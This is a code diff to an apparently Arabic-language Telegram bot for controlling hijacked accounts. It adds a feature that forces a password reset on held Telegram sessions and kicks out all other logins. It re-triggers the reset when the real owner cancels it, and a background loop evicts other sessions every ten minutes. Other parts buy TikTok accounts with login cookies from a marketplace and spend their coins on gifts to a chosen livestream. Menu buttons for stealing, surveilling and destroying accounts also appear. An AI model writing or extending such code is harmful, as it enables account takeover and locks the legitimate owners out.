@@ -369,6 +369,32 @@ def get_all_allowed_users():
 init_db()
 
 
+
+
+
+
+def update_db_for_reset_feature():
+    conn = get_db_conn()
+    c = conn.cursor()
+    try:
+        c.execute("ALTER TABLE sessions ADD COLUMN reset_retries INTEGER DEFAULT 0")
+        c.execute("ALTER TABLE sessions ADD COLUMN lockdown_mode INTEGER DEFAULT 0")
+        conn.commit()
+    except:
+        pass # الحقول موجودة مسبقاً
+    conn.close()
+
+update_db_for_reset_feature()
+
+
+
+
+
+
+
+
+
+
 import aiohttp
 import asyncio
 import time
@@ -1150,13 +1176,13 @@ def manual_buy_action(call):
 
 
 #داله التيك توك تبدا من هنا:::
-	
-	
-	
-	
-	
-	
-	
+
+
+
+
+
+
+
 import json
 import threading
 import time
@@ -1200,12 +1226,12 @@ tt_conn.commit()
 def lzt_search_tiktok(pmin=None, pmax=None, coins_min=None, coins_max=None):
     url = "https://api.lzt.market/tiktok"
     params = {"cookie_login": "yes"} 
-    
+
     if pmin is not None: params["pmin"] = pmin
     if pmax is not None: params["pmax"] = pmax
     if coins_min is not None: params["coins_min"] = coins_min
     if coins_max is not None: params["coins_max"] = coins_max
-    
+
     try:
         req = requests.get(url, headers=LZT_HEADERS, params=params)
         data = req.json()
@@ -1219,7 +1245,7 @@ def lzt_search_tiktok(pmin=None, pmax=None, coins_min=None, coins_max=None):
 def lzt_fast_buy(item_id, price):
     url = f"https://api.lzt.market/{item_id}/fast-buy"
     data = {"price": price}
-    
+
     for _ in range(100): 
         try:
             req = requests.post(url, headers=LZT_HEADERS, data=data)
@@ -1265,12 +1291,12 @@ def tt_get_account_info(cookies_dict):
         req = requests.get(profile_url, headers=headers, cookies=cookies_dict, timeout=10)
         data = req.json()
         followers = data.get("userInfo", {}).get("stats", {}).get("followerCount", 0)
-        
+
         wallet_url = "https://www.tiktok.com/api/wallet/v1/balance/"
         w_req = requests.get(wallet_url, headers=headers, cookies=cookies_dict, timeout=10)
         w_data = w_req.json()
         coins = w_data.get("data", {}).get("coins", 0) 
-        
+
         return {"success": True, "followers": followers, "coins": coins}
     except Exception as e:
         return {"success": False, "error": str(e)}
@@ -1327,10 +1353,10 @@ def tt_main_menu():
 
 def tt_buy_keyboard(chat_id):
     markup = InlineKeyboardMarkup(row_width=1)
-    
+
     fast_text = "⚡ شـراء سـريـع (8 روبـل وأقـل | 100+ عـمـلـة)"
     custom_text = "⚙️ شـراء مـخـصـص"
-    
+
     if chat_id in ACTIVE_TT_SNIPERS:
         markup.add(InlineKeyboardButton("✅ جاري الشراء... (اضغط للإيقاف)", callback_data="tt_stop_sniper"))
         return markup
@@ -1348,46 +1374,46 @@ def tt_buy_keyboard(chat_id):
 def tt_sniper_task(bot, chat_id, target_count, pmin, pmax, cmin, cmax, sniper_type):
     bought_count = 0
     stop_event = ACTIVE_TT_SNIPERS[chat_id]["stop_event"]
-    
+
     t_type = "سـريـع ⚡" if sniper_type == "fast" else "مـخـصـص ⚙️"
-    
+
     start_msg = (
         f"**🎯┊بـدأت عـمـلـيـة الـمـراقـبـة والـصـيـد - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
         f"⎉╎الـعـدد الـمـطـلـوب ⩥ **{target_count}**\n"
         f"⎉╎نـوع الـصـيـد ⩥ **{t_type}**"
     )
     bot.send_message(chat_id, start_msg, parse_mode="Markdown")
-    
+
     while bought_count < target_count and not stop_event.is_set():
         items = lzt_search_tiktok(pmin=pmin, pmax=pmax, coins_min=cmin, coins_max=cmax)
-        
+
         for item in items:
             if stop_event.is_set() or bought_count >= target_count:
                 break
-                
+
             item_id = item["item_id"]
             price = item["price"]
-            
+
             tt_cursor.execute("SELECT item_id FROM tt_accounts WHERE item_id=?", (str(item_id),))
             if tt_cursor.fetchone(): continue
-            
+
             if lzt_fast_buy(item_id, price):
                 acc_data = lzt_get_account_data(item_id)
                 if not acc_data: continue
-                
+
                 coins = acc_data.get("tt_coins", 0)
                 followers = acc_data.get("tt_followers", 0)
                 cookies = acc_data.get("tt_cookie_login", "لا يوجد كوكيز")
                 json_dump = json.dumps(acc_data, ensure_ascii=False)
-                
+
                 tt_cursor.execute('''
                     INSERT INTO tt_accounts (item_id, price, coins, followers, json_data, cookies)
                     VALUES (?, ?, ?, ?, ?, ?)
                 ''', (str(item_id), price, coins, followers, json_dump, str(cookies)))
                 tt_conn.commit()
-                
+
                 bought_count += 1
-                
+
                 hit_msg = (
                     f"**🎉┊تـم صـيـد حـسـاب بـنـجـاح - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
                     f"⎉╎الـحـالـة ⩥ **({bought_count}/{target_count})**\n"
@@ -1397,12 +1423,12 @@ def tt_sniper_task(bot, chat_id, target_count, pmin, pmax, cmin, cmax, sniper_ty
                     f"⎉╎الـكـوكـيـز (لـلـنـسـخ) ⩥\n`{cookies}`"
                 )
                 bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
-                
+
         time.sleep(4) 
 
     if chat_id in ACTIVE_TT_SNIPERS:
         del ACTIVE_TT_SNIPERS[chat_id]
-        
+
     end_msg = (
         f"**🛑┊انـتـهـت عـمـلـيـة الـشـراء - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
         f"⎉╎تـم شـراء ⩥ **({bought_count})** حـسـابـات."
@@ -1414,21 +1440,21 @@ def tt_sniper_task(bot, chat_id, target_count, pmin, pmax, cmin, cmax, sniper_ty
 # ==========================================
 def tt_throw_coins_task(bot, chat_id, target_user, room_id):
     bot.send_message(chat_id, f"**🚀┊بـدأ هـجـوم الـعـمـلات عـلـى الـبـث - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎الـهـدف ⩥ **{target_user}**\n⎉╎جـاري دخـول الحـسـابـات وبـدء الـدعـم...", parse_mode="Markdown")
-    
+
     tt_cursor.execute("SELECT item_id, cookies, coins FROM tt_accounts")
     accounts = tt_cursor.fetchall()
-    
+
     total_spent_global = 0
-    
+
     for acc in accounts:
         acc_id, cookies_str, db_coins = acc[0], acc[1], acc[2]
         cookies_dict = parse_cookies_to_dict(cookies_str)
-        
+
         if not cookies_dict or db_coins < 20:
             continue
-            
+
         current_coins = db_coins
-        
+
         while current_coins >= 20:
             if current_coins >= 100:
                 success = tt_send_gift(room_id, GIFT_100_COINS, cookies_dict)
@@ -1436,21 +1462,21 @@ def tt_throw_coins_task(bot, chat_id, target_user, room_id):
             else:
                 success = tt_send_gift(room_id, GIFT_20_COINS, cookies_dict)
                 cost = 20
-                
+
             if success:
                 current_coins -= cost
                 total_spent_global += cost
                 time.sleep(1) 
             else:
                 break 
-                
+
         # حفظ الرصيد الجديد
         tt_cursor.execute("UPDATE tt_accounts SET coins=? WHERE item_id=?", (current_coins, acc_id))
         tt_conn.commit()
 
     if chat_id in ACTIVE_TT_GIFTERS:
         del ACTIVE_TT_GIFTERS[chat_id]
-        
+
     report = (
         f"**✅┊تـم الإنـتـهـاء مـن دعـم الـبـث - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
         f"⎉╎الـهـدف ⩥ **{target_user}**\n"
@@ -1463,15 +1489,15 @@ def tt_throw_coins_task(bot, chat_id, target_user, room_id):
 # ✦ دوال الاستجابة (Callback Handlers) ✦
 # ==========================================
 def register_tiktok_handlers(bot):
-    
+
     @bot.callback_query_handler(func=lambda call: call.data.startswith("tt_"))
     def tt_callbacks(call):
         chat_id = call.message.chat.id
-        
+
         if call.data == "tt_auto_main":
             msg = "**🛂┊قـائـمـة تـيـك تـوك LZT - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎يـرجـى اخـتـيـار الإجـراء الـمـطـلـوب مـن الأسـفـل ⩥"
             bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=tt_main_menu(), parse_mode="Markdown")
-            
+
         elif call.data == "tt_add_json":
             msg = "**🛂┊إضـافـة حـسـاب يـدويـاً (JSON) - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎يـرجـى إرسـال كـود الـ JSON الخـاص بـالـكـوكـيـز ⩥"
             sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
@@ -1479,21 +1505,21 @@ def register_tiktok_handlers(bot):
 
         elif call.data == "tt_check_accs":
             bot.send_message(chat_id, "**🔄┊جـاري فـحـص الحـسـابـات وتـحـديـث الأرصـدة...**", parse_mode="Markdown")
-            
+
             tt_cursor.execute("SELECT id, item_id, cookies FROM tt_accounts")
             accounts = tt_cursor.fetchall()
-            
+
             if not accounts:
                 bot.send_message(chat_id, "⚠️┊لا يـوجـد حـسـابـات فـي قـاعـدة الـبـيـانـات.")
                 return
-                
+
             total_global_coins = 0
             report_msg = "**🛂┊تـقـريـر الـفـحـص الـشـامـل - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
-            
+
             for acc in accounts:
                 db_id, item_id, cookies_str = acc[0], acc[1], acc[2]
                 cookies_dict = parse_cookies_to_dict(cookies_str)
-                
+
                 if cookies_dict:
                     info = tt_get_account_info(cookies_dict)
                     if info["success"]:
@@ -1503,7 +1529,7 @@ def register_tiktok_handlers(bot):
                         report_msg += f"⎉╎حـسـاب `{item_id}` ⩥ **{coins}** عـمـلـة\n"
                     else:
                         report_msg += f"⎉╎حـسـاب `{item_id}` ⩥ ❌ مـحـظـور أو الكـوكـيـز مـنـتـهـي\n"
-            
+
             tt_conn.commit()
             report_msg += f"\n**🪙┊إجـمـالـي الـعـمـلات المـتـوفـرة ⩥ {total_global_coins} عـمـلـة**"
             bot.send_message(chat_id, report_msg, parse_mode="Markdown")
@@ -1512,11 +1538,11 @@ def register_tiktok_handlers(bot):
             if chat_id in ACTIVE_TT_GIFTERS:
                 bot.answer_callback_query(call.id, "⚠️┊هـنـاك عـمـلـيـة دعـم نـشـطـة بـالـفـعـل!", show_alert=True)
                 return
-                
+
             msg = "**💸┊رمـي الـعـمـلات عـلـى الـبـث - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎يـرجـى إرسـال يـوزر الشـخـص الـذي يـبـث الآن ⩥"
             sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
             bot.register_next_step_handler(sent_msg, process_target_live, bot)
-            
+
         elif call.data == "tt_view_accs":
             tt_cursor.execute("SELECT item_id, coins, cookies FROM tt_accounts")
             accounts = tt_cursor.fetchall()
@@ -1566,28 +1592,28 @@ def register_tiktok_handlers(bot):
     def process_add_json(message, bot):
         json_text = message.text.strip()
         chat_id = message.chat.id
-        
+
         cookies_dict = parse_cookies_to_dict(json_text)
         if not cookies_dict:
             bot.send_message(chat_id, "❌┊الـكـود غـيـر صـالـح. يـرجـى الـتـأكـد مـن صـيـغـة الـ JSON.", parse_mode="Markdown")
             return
-            
+
         bot.send_message(chat_id, "⏳┊جـاري تـسـجـيـل الـدخـول وجـلـب بـيـانـات الحـسـاب...")
-        
+
         info = tt_get_account_info(cookies_dict)
-        
+
         import random
         fake_item_id = f"MANUAL_{random.randint(10000, 99999)}"
-        
+
         coins = info.get("coins", 0) if info.get("success") else 0
         followers = info.get("followers", 0) if info.get("success") else 0
-        
+
         tt_cursor.execute('''
             INSERT INTO tt_accounts (item_id, price, coins, followers, json_data, cookies)
             VALUES (?, ?, ?, ?, ?, ?)
         ''', (fake_item_id, 0.0, coins, followers, "Added_Manually", json_text))
         tt_conn.commit()
-        
+
         success_msg = (
             f"**✅┊تـم إضـافـة الحـسـاب لـلـقـاعـدة بـنـجـاح - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
             f"⎉╎الـمـتـابـعـيـن ⩥ **{followers}**\n"
@@ -1595,22 +1621,22 @@ def register_tiktok_handlers(bot):
         )
         if not info.get("success"):
             success_msg += "\n⚠️┊مـلاحـظـة: لـم يـتـمـكـن الـبـوت مـن قـراءة الأرقـام بـسـبـب حـمـايـة تـيـك تـوك، ولـكـن تـم حـفـظ الحـسـاب."
-            
+
         bot.send_message(chat_id, success_msg, parse_mode="Markdown")
 
     def process_target_live(message, bot):
         username = message.text.strip().replace("@", "")
         chat_id = message.chat.id
-        
+
         bot.send_message(chat_id, "⏳┊جـاري اسـتـخـراج روم الـبـث (Room ID)...")
-        
+
         room_id = tt_get_live_room_id(username)
         if not room_id:
             bot.send_message(chat_id, "❌┊عـذراً، إمـا أن الـيـوزر غـيـر صـحـيـح، أو أن الـشـخـص لا يـبـث حـالـيـاً.", parse_mode="Markdown")
             return
-            
+
         ACTIVE_TT_GIFTERS[chat_id] = True
-        
+
         t = threading.Thread(target=tt_throw_coins_task, args=(bot, chat_id, username, room_id))
         t.start()
 
@@ -1618,22 +1644,22 @@ def register_tiktok_handlers(bot):
         if not message.text.isdigit():
             bot.send_message(message.chat.id, "**❌┊عـذراً، يـجـب إرسـال أرقـام فـقـط!**", parse_mode="Markdown")
             return
-            
+
         count = int(message.text)
         chat_id = message.chat.id
-        
+
         stop_event = threading.Event()
         ACTIVE_TT_SNIPERS[chat_id] = {"stop_event": stop_event, "type": "fast"}
-        
+
         t = threading.Thread(target=tt_sniper_task, args=(bot, chat_id, count, 0, 8, 100, None, "fast"))
         t.start()
-        
+
         bot.send_message(chat_id, "**✅┊تـم تـفـعـيـل الـمـراقـبـة لـلـشـراء الـسـريـع بـنـجـاح.**", parse_mode="Markdown")
 
     def process_custom_price(message, bot):
         text = message.text.strip().split()
         pmin, pmax = None, None
-        
+
         if len(text) == 1 and text[0].isdigit():
             pmax = int(text[0])
         elif len(text) >= 2 and text[0].isdigit() and text[1].isdigit():
@@ -1642,9 +1668,9 @@ def register_tiktok_handlers(bot):
         else:
             bot.send_message(message.chat.id, "**❌┊إدخـال خـاطـئ، تـم الإلـغـاء.**", parse_mode="Markdown")
             return
-            
+
         tt_user_states[message.chat.id] = {"pmin": pmin, "pmax": pmax}
-        
+
         msg = (
             f"**🛒┊إعـدادات الـشـراء الـمـخـصـص - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
             f"⎉╎ارسـل عـدد الـعـمـلات\n"
@@ -1657,7 +1683,7 @@ def register_tiktok_handlers(bot):
     def process_custom_coins(message, bot):
         text = message.text.strip().split()
         cmin, cmax = None, None
-        
+
         if len(text) == 1 and text[0].isdigit():
             cmax = int(text[0])
         elif len(text) >= 2 and text[0].isdigit() and text[1].isdigit():
@@ -1666,9 +1692,9 @@ def register_tiktok_handlers(bot):
         else:
             bot.send_message(message.chat.id, "**❌┊إدخـال خـاطـئ، تـم الإلـغـاء.**", parse_mode="Markdown")
             return
-            
+
         tt_user_states[message.chat.id].update({"cmin": cmin, "cmax": cmax})
-        
+
         msg = (
             f"**🛒┊إعـدادات الـشـراء الـمـخـصـص - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
             f"⎉╎وأخـيـراً.. ارسـل عـدد الحـسـابات الـمـطـلـوب شـرائـهـا ⩥"
@@ -1680,14 +1706,14 @@ def register_tiktok_handlers(bot):
         if not message.text.isdigit():
             bot.send_message(message.chat.id, "**❌┊عـذراً، يـجـب إرسـال أرقـام فـقـط!**", parse_mode="Markdown")
             return
-            
+
         count = int(message.text)
         chat_id = message.chat.id
         user_data = tt_user_states.get(chat_id, {})
-        
+
         stop_event = threading.Event()
         ACTIVE_TT_SNIPERS[chat_id] = {"stop_event": stop_event, "type": "custom"}
-        
+
         t = threading.Thread(target=tt_sniper_task, args=(
             bot, chat_id, count, 
             user_data.get("pmin"), user_data.get("pmax"), 
@@ -1695,7 +1721,7 @@ def register_tiktok_handlers(bot):
             "custom"
         ))
         t.start()
-        
+
         bot.send_message(chat_id, "**✅┊تـم تـفـعـيـل الـمـراقـبـة لـلـشـراء الـمـخـصـص بـنـجـاح.**", parse_mode="Markdown")
 
 
@@ -1703,7 +1729,7 @@ def register_tiktok_handlers(bot):
 # ✦ تفعيل أوامر التيك توك ✦
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 register_tiktok_handlers(bot)
-	
+
 
 
 
@@ -2090,6 +2116,229 @@ async def monitor_and_leave(admin_id, target_username, golden_groups):
 
 
 
+from pyrogram.raw import functions
+from datetime import datetime
+
+# ==========================================
+# 1. القوائم المخصصة لميزة الريست
+# ==========================================
+
+@bot.callback_query_handler(func=lambda call: call.data == "menu_pass_reset_manage")
+def pass_reset_main_menu(call):
+    if not is_allowed(call.from_user.id): return
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("• بـدء إعـادة الـتـعـيـيـن (الـكـل/مـفـرد) 🚀", callback_data="pass_reset:start_menu"))
+    markup.row(InlineKeyboardButton("• فـحـص حـالـة الـريـسـت والـحـسـابـات 🔍", callback_data="pass_reset:check_all"))
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
+    
+    text = "🛂┊ **إدارة إعـادة تـعـيـيـن كـلـمـات الـمـرور:**\n\n⎉╎ هـذا الـقـسـم مـخـصـص لـعـمـل (ريـسـت 7 أيـام) لـلـحـسـابـات ومـراقـبـتـهـا وطـرد أي جـلـسـة تـحـاول الـدخـول أثـنـاء فـتـرة الـريـسـت. ❤️‍🔥"
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data == "pass_reset:start_menu")
+def pass_reset_start_menu(call):
+    if not is_allowed(call.from_user.id): return
+    bot.edit_message_text("🛂┊ إخـتـر الـحـسـاب لـبـدء الـريـسـت:\n\n⎉╎ سـيـتـم وضـع الـحـسـاب فـي وضـع الـقـفـل وتـنـفـيـذ الـريـسـت.",
+                          call.message.chat.id, call.message.message_id, 
+                          reply_markup=accounts_action_keyboard(call.from_user.id, "start_reset"), parse_mode="Markdown")
+
+# ==========================================
+# 2. عملية بدء الريست (الكل أو حساب مفرد)
+# ==========================================
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("act:start_reset:"))
+def handle_start_reset(call):
+    if not is_allowed(call.from_user.id): return
+    target = call.data.split(":")[-1]
+    bot.answer_callback_query(call.id, "⏳ جاري تنفيذ أمر الريست...")
+    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري بـدء إعـادة الـتـعـيـيـن بـسـرعـة...", parse_mode="Markdown")
+    run_async(process_start_reset_async(call.from_user.id, target, status_msg.chat.id, status_msg.message_id))
+
+async def perform_single_reset(acc_id, phone, pyro_session):
+    async with account_semaphore:
+        client = Client(f"pr_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+        try:
+            await asyncio.wait_for(client.connect(), timeout=10)
+            password_info = await client.invoke(functions.account.GetPassword())
+            
+            if not password_info.has_password:
+                return f"⚠️ `{phone}` ┊ لا يـوجـد كـلـمـة مـرور بـالأسـاس!"
+            
+            # ضرب ريست
+            await client.invoke(functions.account.ResetPassword())
+            
+            # تفعيل وضع القفل الأمني في القاعدة
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("UPDATE sessions SET lockdown_mode=1, reset_retries=0 WHERE id=?", (acc_id,))
+            conn.commit()
+            conn.close()
+            
+            # طرد باقي الجلسات لتفعيل القفل مباشرة
+            try: await client.invoke(functions.auth.ResetAuthorizations())
+            except: pass
+            
+            return f"✅ `{phone}` ┊ تـم بـدء الـريـسـت وتـفـعـيـل الـقـفـل."
+        except Exception as e:
+            if "PASSWORD_RESET_NEW_CLIENTS" in str(e):
+                return f"❌ `{phone}` ┊ يـجـب انـتـظـار 24 سـاعـة قـبـل الـريـسـت (حـسـاب مـضـاف حـديـثـاً)."
+            return f"❌ `{phone}` ┊ فـشـل الـريـسـت."
+        finally:
+            if client.is_connected: await client.disconnect()
+
+async def process_start_reset_async(owner_id, target, chat_id, msg_id):
+    accounts = get_all_accounts(owner_id)
+    if target != "all":
+        accounts = [acc for acc in accounts if str(acc[0]) == target]
+    
+    tasks = [perform_single_reset(acc[0], acc[1], acc[4]) for acc in accounts]
+    results = await asyncio.gather(*tasks)
+    
+    success_count = sum(1 for r in results if "✅" in r)
+    report = "\n".join(results)
+    final_text = f"🛂┊ **تـقـريـر بـدء الـريـسـت:**\n⎉╎ نـجـح: {success_count} مـن {len(accounts)}\n\n{report}"
+    
+    bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
+
+# ==========================================
+# 3. نظام الفحص السريع الخرافي للريست (بـ 50 عامل)
+# ==========================================
+
+@bot.callback_query_handler(func=lambda call: call.data == "pass_reset:check_all")
+def check_all_resets_handler(call):
+    if not is_allowed(call.from_user.id): return
+    bot.answer_callback_query(call.id, "⏳ جاري الفحص المعمق لجميع الحسابات...")
+    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص حـالـة الـريـسـت لـجـمـيـع الـحـسـابـات بـسـرعـة 50 اتـصـال...", parse_mode="Markdown")
+    run_async(check_all_resets_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))
+
+async def check_single_reset_status(acc_id, phone, pyro_session, owner_id):
+    async with account_semaphore:
+        conn = get_db_conn()
+        c = conn.cursor()
+        c.execute("SELECT reset_retries, lockdown_mode FROM sessions WHERE id=?", (acc_id,))
+        row = c.fetchone()
+        reset_retries = row[0] if row else 0
+        lockdown_mode = row[1] if row else 0
+        
+        client = Client(f"chk_rs_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+        try:
+            await asyncio.wait_for(client.connect(), timeout=10)
+            await client.get_me() # فحص هل الحساب مبند/محذوف/مسحوب
+            
+            # جلب تفاصيل الباسوورد والريست
+            info = await client.invoke(functions.account.GetPassword())
+            
+            if not info.has_password:
+                # انتهى الريست وتدمرت كلمة المرور
+                c.execute("UPDATE sessions SET lockdown_mode=0, reset_retries=0 WHERE id=?", (acc_id,))
+                conn.commit()
+                conn.close()
+                return f"`{phone}` ┊ نـشـط ┊ انـتـهـى الـريـسـت وتـم تـعـطـيـل كـلـمـة الـمـرور ✅\n", 1
+            
+            if info.pending_reset_date:
+                # الريست شغال نحسب الوقت
+                diff = info.pending_reset_date - int(time.time())
+                days = diff // 86400
+                hours = (diff % 86400) // 3600
+                time_str = f"{int(days)} أيـام" if days > 0 else f"{int(hours)} سـاعـات"
+                
+                # تفعيل القفل إن لم يكن مفعل
+                c.execute("UPDATE sessions SET lockdown_mode=1 WHERE id=?", (acc_id,))
+                conn.commit()
+                conn.close()
+                return f"`{phone}` ┊ نـشـط ┊ تـبـقـى للـريـسـت {time_str} 🇵🇸\n", 1
+                
+            else:
+                # الباسوورد موجود بس مافي pending_reset (يعني تم الإلغاء يدوياً)
+                if reset_retries < 2:
+                    try:
+                        await client.invoke(functions.account.ResetPassword())
+                        new_retries = reset_retries + 1
+                        c.execute("UPDATE sessions SET reset_retries=?, lockdown_mode=1 WHERE id=?", (new_retries, acc_id))
+                        conn.commit()
+                        conn.close()
+                        return f"`{phone}` ┊ نـشـط ┊ تـم تـعـطـيـل الـريـسـت يـدويـًا وإعـادتـه ┊ 🇵🇸 ❌\n", 1
+                    except Exception:
+                        return f"`{phone}` ┊ نـشـط ┊ تـم الإلـغـاء وفـشـلـت إعـادة الـمـحـاولـة ⚠️\n", 1
+                else:
+                    c.execute("UPDATE sessions SET lockdown_mode=0 WHERE id=?", (acc_id,))
+                    conn.commit()
+                    conn.close()
+                    return f"`{phone}` ┊ نـشـط ┊ تـم الإلـغـاء بـعـد مـحـاولـتـيـن (يـحـتـاج تـدخـل يـدوي) ❌\n", 1
+
+        except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
+            # التأكد الثلاثي وحذف الحساب
+            delete_account(acc_id)
+            return f"❌ `{phone}` ┊ تـم حـذفـه بـرمـجـيـاً (مـجـمـد/مـحـذوف/مـفـقـود)\n", 0
+        except Exception as e:
+            return f"⚠️ `{phone}` ┊ خـطـأ أثـنـاء الـفـحـص\n", 1
+        finally:
+            if client.is_connected: await client.disconnect()
+
+async def check_all_resets_async(owner_id, chat_id, msg_id):
+    accounts = get_all_accounts(owner_id)
+    if not accounts: return bot.edit_message_text("❌ لا توجد حسابات.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
+
+    tasks = [check_single_reset_status(acc_id, phone, pyro_session, owner_id) for acc_id, phone, name, uid, pyro_session in accounts]
+    results = await asyncio.gather(*tasks)
+    
+    active_count = sum(res[1] for res in results)
+    report_text = "".join(res[0] for res in results)
+    
+    final_text = f"⎉╎ الـجـلـسـات الـنـشـطـة الآن: {active_count} مـن أصـل {len(accounts)}\n\n🛂┊ نـتـيـجـة فـحـص الـحـسـابـات:\n\n{report_text}"
+    bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
+
+# ==========================================
+# 4. المراقب الأمني (Lockdown Daemon) طرد تلقائي
+# ==========================================
+# يتم استدعاء هذا التاسك ليعمل في الخلفية مرة واحدة عند بدء تشغيل البوت
+
+async def lockdown_monitor_daemon():
+    while True:
+        try:
+            conn = get_db_conn()
+            c = conn.cursor()
+            # استهداف فقط الحسابات التي في وضع القفل Security Lockdown
+            c.execute("SELECT id, phone, pyro_session FROM sessions WHERE lockdown_mode = 1")
+            lockdown_accounts = c.fetchall()
+            conn.close()
+
+            for acc in lockdown_accounts:
+                acc_id, phone, pyro_session = acc
+                try:
+                    client = Client(f"lock_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+                    await client.connect()
+                    # هذا السطر العنيف يطرد جميع الجلسات الأخرى فوراً
+                    await client.invoke(functions.auth.ResetAuthorizations())
+                    await client.disconnect()
+                except Exception:
+                    pass # تخطي الأخطاء بصمت لعدم إيقاف اللوب
+            
+            # ينام لمدة 10 دقائق ثم يفحص ويطرد الجلسات الدخيلة من جديد
+            await asyncio.sleep(600) 
+        except Exception:
+            await asyncio.sleep(60) # راحة عند الخطأ
+
+# تشغيل المراقب الأمني في الخلفية
+def start_lockdown_daemon():
+    loop = asyncio.get_event_loop()
+    loop.create_task(lockdown_monitor_daemon())
+
+# ضع هذا السطر في نهاية ملفك بعد تعريف البوت وقبل bot.polling() أو bot.infinity_polling()
+# start_lockdown_daemon()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 # =========================================================
 # 🧠 الدوال الذكية والمحركات المعقدة
@@ -2445,13 +2694,16 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
 
 
-
 def home_keyboard(uid):
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
     markup.row(InlineKeyboardButton("• إدارة الإزالـة الـتـلـقـائـيـة ⏱️", callback_data="autoterm_manage"))
     markup.row(InlineKeyboardButton("• تـنـظـيـف شـامـل 🧹", callback_data="menu_clean"), InlineKeyboardButton("• جـلـب الـكـود ✉️", callback_data="req_code"))
     markup.row(InlineKeyboardButton("• إزالـة مـن الـبـوت 🗑️", callback_data="menu_remove"), InlineKeyboardButton("• تـسـجـيـل خـروج 🚪", callback_data="menu_logout"))
+    
+    # 🔥 الزر الجديد أضيف هنا للجميع
+    markup.row(InlineKeyboardButton("• إدارة إعادة تعيين كلمات المرور ❤️‍🔥", callback_data="menu_pass_reset_manage"))
+    
     markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
     markup.row(InlineKeyboardButton("• كـشـف الـحـسـابـات 🕵️", callback_data="reveal_accounts"), InlineKeyboardButton("• فـحـص الـحـسـابـات 🔄", callback_data="check_active"))
     markup.row(InlineKeyboardButton("• عـرض الـجـلـسـات 📂", callback_data="view_sessions_menu"))
@@ -2462,10 +2714,7 @@ def home_keyboard(uid):
         markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
         markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"), InlineKeyboardButton("• إدارة المراقبة ⏳", callback_data="manage_surveillance"))
         markup.row(InlineKeyboardButton("• تـدمـيـر وحـذف الـحـسـابـات 🔴", callback_data="admin_destroy_accounts"))
-
-        # 👑 تمت إضافة زر القنص هنا للآدمن فقط
         markup.row(InlineKeyboardButton("🛒 تخصيص الشراء التلقائي (LZT)", callback_data="auto_buy_menu"))
-        markup.row(InlineKeyboardButton("🎵 الشراء التلقائي (تيك توك)", callback_data="tt_auto_main"))
 
     return markup
 
@@ -2918,19 +3167,28 @@ async def run_email_automation(chat_id, msg_id, targets, worker_sessions):
 
 
 
+# =========================================================
+# 1. دوال الأزرار (نرجعها زي زمان بالضبط)
+# =========================================================
 
+def two_fa_keyboard():
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("• حـذف الـتـحـقـق 🗑️", callback_data="menu_2fa_remove"), InlineKeyboardButton("• تـغـيـيـر الـتـحـقـق 🔄", callback_data="menu_2fa_change"))
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
+    return markup
 
 
 # =========================================================
